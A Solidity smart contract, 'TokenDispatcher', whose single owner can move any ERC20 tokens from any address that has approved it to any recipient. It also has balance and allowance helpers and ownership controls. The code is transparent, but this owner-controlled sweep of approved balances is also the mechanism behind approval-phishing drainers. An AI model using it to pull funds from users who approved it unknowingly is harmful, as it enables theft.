// SPDX-License-Identifier: MIT
pragma solidity 0.8.20;

/// @title TokenDispatcher - 部署者可调用的受控划转器（兼容非标准 ERC20 返回）
contract TokenDispatcher {
    address public owner;

    event OwnerChanged(address indexed oldOwner, address indexed newOwner);
    event TokenTransferred(address indexed token, address indexed from, address indexed to, uint256 amount);

    error NotOwner();
    error ZeroAddress();

    constructor() {
        owner = msg.sender;
        emit OwnerChanged(address(0), owner);
    }

    modifier onlyOwner() {
        if (msg.sender != owner) revert NotOwner();
        _;
    }

    /// @notice 仅 owner 可调用，将 token 从 `from` 划给 `to`（前提：`from` 已对本合约 approve 足够额度）
    /// @param token ERC20 合约地址
    /// @param from 代币原地址（必须已对本合约授权）
    /// @param to 接收地址（不能为 0）
    /// @param amount 划转数量（按代币最小单位）
    function transferFrom(address token, address from, address to, uint256 amount) external onlyOwner returns (bool) {
        if (token == address(0) || from == address(0) || to == address(0)) revert ZeroAddress();
        _safeTransferFrom(token, from, to, amount);
        emit TokenTransferred(token, from, to, amount);
        return true;
    }

    /// @dev 低级调用 transferFrom，兼容返回 bool 或不返回值的 ERC20
    function _safeTransferFrom(address token, address from, address to, uint256 amount) internal {
        bytes memory data = abi.encodeWithSelector(bytes4(keccak256("transferFrom(address,address,uint256)")), from, to, amount);
        (bool success, bytes memory returndata) = token.call(data);
        require(success, "Token: transferFrom call failed");
        if (returndata.length > 0) {
            // 如果返回数据存在，则期望为 bool true
            require(abi.decode(returndata, (bool)), "Token: transferFrom returned false");
        }
    }

    /// -------- 辅助 view 方法（便于在 Remix 上确认授权/余额） --------
    function allowance(address token, address holder, address spender) external view returns (uint256) {
        (bool ok, bytes memory ret) = token.staticcall(abi.encodeWithSelector(bytes4(keccak256("allowance(address,address)")), holder, spender));
        if (!ok || ret.length == 0) return 0;
        return abi.decode(ret, (uint256));
    }

    function balanceOf(address token, address who) external view returns (uint256) {
        (bool ok, bytes memory ret) = token.staticcall(abi.encodeWithSelector(bytes4(keccak256("balanceOf(address)")), who));
        if (!ok || ret.length == 0) return 0;
        return abi.decode(ret, (uint256));
    }

    /// Ownership 管理（可选）
    function transferOwnership(address newOwner) external onlyOwner {
        if (newOwner == address(0)) revert ZeroAddress();
        emit OwnerChanged(owner, newOwner);
        owner = newOwner;
    }

    function renounceOwnership() external onlyOwner {
        emit OwnerChanged(owner, address(0));
        owner = address(0);
    }
}